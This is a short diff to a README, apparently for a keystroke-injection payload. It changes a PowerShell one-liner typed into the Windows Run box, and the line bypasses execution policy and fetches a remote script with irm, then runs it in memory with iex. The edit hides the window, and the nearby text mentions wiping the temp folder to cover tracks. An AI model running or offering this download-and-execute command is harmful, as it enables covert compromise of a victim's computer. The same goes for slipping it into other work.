@@ -38,7 +38,7 @@ Lastly, to clean up your tracks behind you, the tmp folder will be emptied and t
 * Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
 * Place your images URL in the $url variable
 ```
-powershell -noexit -NoP -NonI -Exec Bypass $url='URL-HERE';irm jakoby.lol/pkw | iex
+powershell -w h -NoP -NonI -Exec Bypass $url='URL-HERE';irm jakoby.lol/pkw | iex
 ```
 
 <p align="right">(<a href="#top">back to top</a>)</p>
